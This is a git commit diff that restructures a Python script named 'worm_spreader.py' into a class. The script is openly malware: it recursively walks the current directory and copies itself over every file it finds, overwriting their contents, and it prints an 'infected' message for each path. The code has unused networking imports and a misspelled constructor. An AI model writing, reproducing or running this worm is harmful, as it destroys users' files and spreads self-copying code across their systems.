14be9d0eabac247ae269b8f61ccf42f24af465a8
TheSilverGorilla <83459890+TheSilverGorilla@users.noreply.github.com>
2021-10-02 15:50:41 -0500

    Update worm_spreader.py

--- worm_spreader.py
+++ worm_spreader.py
@@ -2,48 +2,53 @@ import os
 import sys
 import shutil
 import time
+import socketserver
+import socket
+import optparse
 
 directories = []
 filename = sys.argv[0]
 
 # Beginning worm_drive function.
-def filtering_and_expanding(path):
-    for sub_dirs in os.listdir(path):
-        if not sub_dirs.startswith('.') \
-                and not sub_dirs.startswith(str(filename)) \
-                and not sub_dirs.startswith('smbmap') \
-                and not sub_dirs.startswith('venv'):
-            directories.append(path + '/' + sub_dirs)
+class worm_drive:
+    def __init(self):
+        pass
+    def filtering_and_expanding(self, path):
+        for sub_dirs in os.listdir(path):
+            if not sub_dirs.startswith('.') and not sub_dirs.startswith(str(filename)):
+                directories.append(path + '/' + sub_dirs)
 
-
-def copies(path):
-    try:
-        destination = path
-        shutil.copy(filename, destination)
-    except Exception as e:
-        print(e)
-
-
-filtering_and_expanding(os.getcwd())
-
-
-def initialiting():
-    for i in directories:
-        if os.path.isdir(i):
-            available_directories = i
-            filtering_and_expanding(available_directories)
-        if os.path.isfile(i):
-            copies(i)
-
-
-def worm_spreading():
-    initialiting()
-    for i in directories:
+    def copies(self, path):
         try:
-            print('[+] Successfully infected file or directory: ' + i)
-            time.sleep(1)
+            destination = path
+            shutil.copy(filename, destination)
         except Exception as e:
-            print('[-] file infection failed on ' + i + " reason is " + str(e))
-            time.sleep(1)
+            print(e)
 
-# End of worm-drive function.
+    def starting(self):
+        self.filtering_and_expanding(os.getcwd())
+
+
+    def initialiting(self):
+        for i in directories:
+            if os.path.isdir(i):
+                available_directories = i
+                self.filtering_and_expanding(available_directories)
+            if os.path.isfile(i):
+                self.copies(i)
+
+
+    def worm_spreading(self):
+        self.initialiting()
+        for i in directories:
+            try:
+                print('[+] Successfully infected file or directory: ' + i)
+                time.sleep(1)
+            except Exception as e:
+                print('[-] file infection failed on ' + i + " reason is " + str(e))
+                time.sleep(1)
+#comment
+w = worm_drive()
+
+w.starting()
+w.worm_spreading()
